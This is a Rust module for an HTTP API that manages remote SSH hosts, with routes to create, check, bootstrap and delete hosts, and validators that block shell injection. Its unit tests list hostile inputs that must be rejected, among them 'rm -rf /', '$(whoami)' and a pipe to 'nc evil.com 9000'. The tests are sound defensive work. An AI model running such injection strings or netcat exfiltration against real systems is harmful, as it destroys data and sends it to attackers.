//! Host CRUD + bootstrap HTTP surface (REMOTE_PLAN.md RT8).
//!
//! **Router-registry pattern (TECH_PLAN §3.4).** [`router_for`] returns this
//! module's sub-router; [`crate::http::router`] merges it under the bearer
//! auth layer with one `.merge(...)` line. Mounting under `/api/` is enough
//! — `auth_middleware` has no path carve-outs, so every route here is
//! bearer-gated by virtue of the merge order in `http::protected_router`.
//!
//! **Scope.** Five user-facing routes wrap the RT4 DB surface plus an
//! ssh-out bootstrap probe:
//!   * `GET /api/hosts` — list live hosts.
//!   * `POST /api/hosts` — create + auto-run a reachability check.
//!   * `GET /api/hosts/{id}` — fetch one (404 on miss).
//!   * `DELETE /api/hosts/{id}` — soft-delete; refuses (409) if any session
//!     still references the host in a non-stopped state.
//!   * `POST /api/hosts/{id}/check` — reachability probe; updates `status`.
//!   * `POST /api/hosts/{id}/bootstrap` — remote prerequisite checklist.
//!
//! **Security.** `name` / `ssh_target` / `public_key` are matched against
//! strict allow-list regexes BEFORE they ever feed an `ssh` argv. The remote
//! side is invoked via fixed argv after `--`, never via shell composition.
//! See [`SSH_TARGET_RE`] and [`valid_public_key`].
//!
//! **HTTP envelope (§3.4).** Successful responses are `{ok: true, data: T}`;
//! errors are `{ok: false, error: "..."}` via [`crate::error::AppError`].

pub mod bootstrap;

use std::time::Duration;

use axum::body::Bytes;
use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::{Json, Router};
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use tokio::process::Command;

use crate::db::hosts::{self, Host, HostStatus};
use crate::error::AppError;
use crate::state::AppState;

/// Build the hosts sub-router (no auth layer — applied by `http::router`).
pub fn router_for(state: AppState) -> Router {
    use axum::routing::{get, post};
    Router::new()
        .route("/api/hosts", get(list_handler).post(create_handler))
        .route(
            "/api/hosts/{id}",
            get(get_handler).delete(delete_handler),
        )
        .route("/api/hosts/{id}/check", post(check_handler))
        .route("/api/hosts/{id}/bootstrap", post(bootstrap_handler))
        .with_state(state)
}

// ── HTTP envelope ────────────────────────────────────────────────────────────

#[derive(Serialize)]
struct Envelope<T> {
    ok: bool,
    data: T,
}

fn ok<T: Serialize>(data: T) -> Json<Envelope<T>> {
    Json(Envelope { ok: true, data })
}

// ── validation ───────────────────────────────────────────────────────────────

/// `name` rule: letters, digits, `_`, `.`, `-`, length 1..=64. No shell meta.
static NAME_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[a-zA-Z0-9._-]{1,64}$").unwrap());

/// `ssh_target` rule: `[user@]host[:port]`. `user` and `host` allow
/// letters/digits/`._-` only; `host` may be an IPv4 literal or a DNS-style
/// label chain (`a.b.c.tailnet.ts.net`). Port is bare digits, 1..=65535. The
/// regex is deliberately strict so any shell metacharacter (`;`, `&`, ` `,
/// backtick, `$`, quote, redirection) → reject at the HTTP layer.
pub(crate) static SSH_TARGET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^(?:[a-zA-Z0-9._-]{1,64}@)?[a-zA-Z0-9.-]{1,253}(?::[0-9]{1,5})?$").unwrap()
});

/// Allowed public-key algorithm tokens (the SSH "type" prefix). Anything else
/// is rejected — keeps the surface minimal and aligned with what
/// `~/.ssh/authorized_keys` actually consumes.
const PUBKEY_ALGOS: &[&str] = &["ssh-rsa", "ssh-ed25519", "ecdsa-sha2-nistp256"];

/// Validate a `name` against [`NAME_RE`].
fn valid_name(name: &str) -> bool {
    NAME_RE.is_match(name)
}

/// Validate an `ssh_target` against [`SSH_TARGET_RE`]. Additionally checks the
/// optional `:port` is in `1..=65535` (regex only bounds digit count).
fn valid_ssh_target(target: &str) -> bool {
    if !SSH_TARGET_RE.is_match(target) {
        return false;
    }
    // Port range guard — regex caps `[0-9]{1,5}` but `99999` slips through.
    if let Some((_host, port)) = target.rsplit_once(':') {
        if let Ok(p) = port.parse::<u32>() {
            if !(1..=65535).contains(&p) {
                return false;
            }
        }
    }
    true
}

/// Validate a `public_key` body field. Must:
///   * Start with one of [`PUBKEY_ALGOS`].
///   * Contain no newlines / carriage returns / NULs.
///   * Contain no shell metacharacters that would survive single-line append
///     (`;`, backtick, `$(`, `&&`, `||`, `|`, redirection, ANSI).
///   * Be a sensible length (≤ 8 KiB — well above any real key).
pub(crate) fn valid_public_key(key: &str) -> bool {
    if key.len() > 8 * 1024 {
        return false;
    }
    if key
        .bytes()
        .any(|b| b == b'\n' || b == b'\r' || b == 0 || b == b'`')
    {
        return false;
    }
    // Forbid the common shell-injection sigils. The key body is base64 +
    // optional comment, so none of these belong in a valid key.
    for needle in &[";", "$(", "&&", "||", "|", "<", ">"] {
        if key.contains(needle) {
            return false;
        }
    }
    let head = key.split_whitespace().next().unwrap_or("");
    PUBKEY_ALGOS.contains(&head)
}

// ── view model ───────────────────────────────────────────────────────────────

/// HTTP view of a [`Host`]. Drops `deleted_at` (callers only ever see live
/// rows via [`hosts::list`]; the single-id fetch also filters tombstones in
/// [`get_handler`]).
#[derive(Debug, Serialize)]
pub struct HostView {
    pub id: i64,
    pub name: String,
    pub ssh_target: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ssh_key_path: Option<String>,
    pub status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_seen: Option<i64>,
    pub created_at: i64,
}

impl From<Host> for HostView {
    fn from(h: Host) -> Self {
        Self {
            id: h.id,
            name: h.name,
            ssh_target: h.ssh_target,
            ssh_key_path: h.ssh_key_path,
            status: h.status,
            last_seen: h.last_seen,
            created_at: h.created_at,
        }
    }
}

// ── handlers ─────────────────────────────────────────────────────────────────

async fn list_handler(
    State(state): State<AppState>,
) -> Result<Json<Envelope<Vec<HostView>>>, AppError> {
    let rows = hosts::list(&state.pool).await?;
    Ok(ok(rows.into_iter().map(HostView::from).collect()))
}

async fn get_handler(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> Result<Json<Envelope<HostView>>, AppError> {
    let row = hosts::get(&state.pool, id)
        .await?
        .filter(|h| h.deleted_at.is_none())
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;
    Ok(ok(HostView::from(row)))
}

#[derive(Debug, Deserialize)]
pub struct CreateInput {
    pub name: String,
    pub ssh_target: String,
    #[serde(default)]
    pub ssh_key_path: Option<String>,
}

async fn create_handler(
    State(state): State<AppState>,
    Json(input): Json<CreateInput>,
) -> Result<impl IntoResponse, AppError> {
    let name = input.name.trim();
    let ssh_target = input.ssh_target.trim();
    let ssh_key_path = input
        .ssh_key_path
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty());

    if name.is_empty() {
        return Err(AppError::BadRequest("name is required".into()));
    }
    if !valid_name(name) {
        return Err(AppError::BadRequest(
            "invalid name (allowed: letters, digits, '_', '.', '-', 1..=64 chars)".into(),
        ));
    }
    if ssh_target.is_empty() {
        return Err(AppError::BadRequest("ssh_target is required".into()));
    }
    if !valid_ssh_target(ssh_target) {
        return Err(AppError::BadRequest(
            "invalid ssh_target (expected [user@]host[:port], no shell meta)".into(),
        ));
    }
    // Path validation: a key path is a filesystem path — reject only NUL/newline
    // so a typo doesn't silently corrupt the row, but allow `~`, `/`, spaces.
    if let Some(p) = ssh_key_path {
        if p.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
            return Err(AppError::BadRequest(
                "invalid ssh_key_path (NUL / newline)".into(),
            ));
        }
    }

    // Duplicate-name short-circuit (clean 409 instead of leaking the SQLite
    // UNIQUE constraint message). A racing create still surfaces as a 409 via
    // the fallthrough branch below.
    if let Some(existing) = hosts::get_by_name(&state.pool, name).await? {
        if existing.deleted_at.is_none() {
            return Err(AppError::Conflict(format!("host '{name}' already exists")));
        }
        // A tombstone with the same name is genuinely a conflict too — the row
        // still occupies the UNIQUE slot.
        return Err(AppError::Conflict(format!(
            "host name '{name}' is taken by a soft-deleted row; choose a different name"
        )));
    }

    let created = match hosts::create(&state.pool, name, ssh_target, ssh_key_path).await {
        Ok(h) => h,
        Err(sqlx::Error::Database(db_err)) if is_unique_violation(db_err.as_ref()) => {
            // Race lost the get_by_name check — still a 409.
            return Err(AppError::Conflict(format!("host '{name}' already exists")));
        }
        Err(e) => return Err(AppError::from(e)),
    };

    // Best-effort auto-check after create — surfaces the freshly-stored status
    // in the response payload via a re-fetch. Failures here MUST NOT poison the
    // create (the row is already persisted; the FE will show "unknown" and
    // offer a manual recheck button).
    let id = created.id;
    let _ = run_reachability_check(&state, id).await;

    // Re-fetch so the response carries the post-check status + last_seen.
    let refreshed = hosts::get(&state.pool, id)
        .await?
        .ok_or(AppError::NotFound(format!("host id={id}")))?;
    Ok((StatusCode::CREATED, ok(HostView::from(refreshed))))
}

async fn delete_handler(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> Result<impl IntoResponse, AppError> {
    let host = hosts::get(&state.pool, id)
        .await?
        .filter(|h| h.deleted_at.is_none())
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;

    // Refuse if any non-stopped session still references this host. The
    // sessions table has no `status` column — `last_status` lives in
    // `session_runtime` — so we LEFT JOIN it. A missing runtime row reads as
    // `unknown` (still NOT in our "safe-to-delete" set: `stopped`/`dead`).
    //
    // The REMOTE_PLAN.md spec says `WHERE status NOT IN ('stopped','dead')`
    // — `dead` isn't in our `last_status` CHECK constraint, but we honor the
    // contract so a future migration that adds it requires no code change.
    let active: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM sessions s \
         LEFT JOIN session_runtime r ON r.name = s.name \
         WHERE s.host_id = ? \
           AND COALESCE(r.last_status, 'unknown') NOT IN ('stopped','dead')",
    )
    .bind(id)
    .fetch_one(&state.pool)
    .await
    .map_err(AppError::from)?;

    if active > 0 {
        return Err(AppError::Conflict(format!(
            "host '{name}' has {active} active session(s); stop them before deleting",
            name = host.name,
        )));
    }

    hosts::soft_delete(&state.pool, id).await?;
    Ok(StatusCode::NO_CONTENT)
}

// ── reachability ─────────────────────────────────────────────────────────────

/// `POST /api/hosts/{id}/check` payload.
#[derive(Debug, Serialize)]
pub struct CheckReport {
    /// One of `unknown` / `reachable` / `unreachable` (post-probe).
    pub status: String,
    /// Unix seconds of the last reachable probe (NULL if never).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_seen: Option<i64>,
    /// SSH stderr snippet on failure, omitted on success.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

async fn check_handler(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> Result<Json<Envelope<CheckReport>>, AppError> {
    // 404 on missing/tombstoned hosts so the FE recheck button never silently
    // updates a deleted row.
    let _ = hosts::get(&state.pool, id)
        .await?
        .filter(|h| h.deleted_at.is_none())
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;

    let report = run_reachability_check(&state, id).await?;
    Ok(ok(report))
}

/// Run the canonical reachability probe (used by both `POST .../check` and the
/// auto-check that fires after `POST /api/hosts`). Updates `status` + `last_seen`
/// in the DB and returns a fresh [`CheckReport`].
async fn run_reachability_check(state: &AppState, id: i64) -> Result<CheckReport, AppError> {
    let host = hosts::get(&state.pool, id)
        .await?
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;

    // We re-validate `ssh_target` here even though create_handler already did.
    // Defense in depth: anything that ever lands in the DB through some other
    // path (manual sqlite3 edit, future bulk-import endpoint) still gets
    // checked before reaching the ssh argv.
    if !valid_ssh_target(&host.ssh_target) {
        return Err(AppError::BadRequest(format!(
            "stored ssh_target '{}' is invalid",
            host.ssh_target
        )));
    }

    // `ssh -o BatchMode=yes -o ConnectTimeout=5 <target> -- echo ok`.
    // BatchMode disables password prompts so a key-less host fails fast rather
    // than hanging. We additionally cap the outer wait with `tokio::time::timeout`
    // — defense against a hung ssh client (very rare with BatchMode but cheap).
    let mut cmd = Command::new("ssh");
    cmd.arg("-o")
        .arg("BatchMode=yes")
        .arg("-o")
        .arg("ConnectTimeout=5")
        .arg("-o")
        .arg("StrictHostKeyChecking=accept-new");
    if let Some(key) = host.ssh_key_path.as_deref() {
        cmd.arg("-i").arg(key);
    }
    cmd.arg(&host.ssh_target).arg("--").arg("echo").arg("ok");

    let result = tokio::time::timeout(Duration::from_secs(10), cmd.output()).await;
    let (status, error) = match result {
        Ok(Ok(out)) if out.status.success() && out.stdout.starts_with(b"ok") => {
            (HostStatus::Reachable, None)
        }
        Ok(Ok(out)) => {
            let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
            (
                HostStatus::Unreachable,
                Some(if stderr.is_empty() {
                    format!("ssh exited with status {}", out.status)
                } else {
                    stderr
                }),
            )
        }
        Ok(Err(e)) => (HostStatus::Unreachable, Some(format!("ssh spawn: {e}"))),
        Err(_) => (
            HostStatus::Unreachable,
            Some("ssh timed out after 10s".into()),
        ),
    };

    hosts::update_status(&state.pool, id, status).await?;
    let after = hosts::get(&state.pool, id)
        .await?
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;
    Ok(CheckReport {
        status: after.status,
        last_seen: after.last_seen,
        error,
    })
}

// ── bootstrap ────────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize, Default)]
pub struct BootstrapInput {
    /// Optional SSH public key to append to the remote `~/.ssh/authorized_keys`
    /// (deduplicated). Must pass [`valid_public_key`].
    #[serde(default)]
    pub public_key: Option<String>,
}

async fn bootstrap_handler(
    State(state): State<AppState>,
    Path(id): Path<i64>,
    body: Bytes,
) -> Result<Json<Envelope<bootstrap::BootstrapReport>>, AppError> {
    let input: BootstrapInput = if body.is_empty() {
        BootstrapInput::default()
    } else {
        serde_json::from_slice(&body).map_err(|_| {
            AppError::BadRequest("expected JSON body {public_key?: \"...\"}".into())
        })?
    };

    if let Some(ref key) = input.public_key {
        if !valid_public_key(key) {
            return Err(AppError::BadRequest(
                "invalid public_key (must start with ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256, no shell meta)".into(),
            ));
        }
    }

    let host = hosts::get(&state.pool, id)
        .await?
        .filter(|h| h.deleted_at.is_none())
        .ok_or_else(|| AppError::NotFound(format!("host id={id}")))?;

    if !valid_ssh_target(&host.ssh_target) {
        return Err(AppError::BadRequest(format!(
            "stored ssh_target '{}' is invalid",
            host.ssh_target
        )));
    }

    let report = bootstrap::run(
        &host.ssh_target,
        host.ssh_key_path.as_deref(),
        input.public_key.as_deref(),
    )
    .await;
    Ok(ok(report))
}

// ── helpers ──────────────────────────────────────────────────────────────────

/// SQLite surfaces a `UNIQUE` violation through the generic
/// `DatabaseError` path; the cheapest match is on the message — it contains
/// the literal `"UNIQUE constraint failed"` for every supported sqlx version.
fn is_unique_violation(err: &dyn sqlx::error::DatabaseError) -> bool {
    let msg = err.message();
    msg.contains("UNIQUE constraint failed") || msg.contains("UNIQUE")
}

// ── unit tests for the pure validators (cheap; live alongside the module) ────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn name_validation_allows_basics() {
        for ok in &["alpha", "ml-rig", "rig_01", "host.local", "A1.b2-c3"] {
            assert!(valid_name(ok), "{ok:?} should validate");
        }
        for bad in &["", " ", "with space", "back`tick", "slash/x", "semi;rm"] {
            assert!(!valid_name(bad), "{bad:?} should reject");
        }
    }

    #[test]
    fn name_length_cap_64() {
        let long: String = std::iter::repeat('a').take(65).collect();
        assert!(!valid_name(&long));
        let ok: String = std::iter::repeat('a').take(64).collect();
        assert!(valid_name(&ok));
    }

    #[test]
    fn ssh_target_validation() {
        for ok in &[
            "host",
            "user@host",
            "user@host:22",
            "user.name@host-1.tailnet.ts.net",
            "10.0.0.1",
            "u@10.0.0.1:2222",
        ] {
            assert!(valid_ssh_target(ok), "{ok:?} should validate");
        }
        for bad in &[
            "",
            "user@",
            "host;rm -rf /",
            "host && evil",
            "$(whoami)",
            "host:99999",
            "user with space@host",
            "host:0",
            "host\nrm",
        ] {
            assert!(!valid_ssh_target(bad), "{bad:?} should reject");
        }
    }

    #[test]
    fn public_key_validation() {
        // A realistic ed25519 key body — base64 plus an optional comment.
        let good = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample user@host";
        assert!(valid_public_key(good));

        for bad in &[
            "",
            "ssh-foo AAAAB3NzaC...",                            // bad algo
            "ssh-ed25519 AAAA\nrm -rf /",                       // newline
            "ssh-ed25519 AAAA`whoami`",                         // backtick
            "ssh-ed25519 AAAA;whoami",                          // semicolon
            "ssh-ed25519 AAAA$(whoami)",                        // command sub
            "ssh-ed25519 AAAA|nc evil.com 9000",                // pipe
        ] {
            assert!(!valid_public_key(bad), "{bad:?} should reject");
        }
    }
}
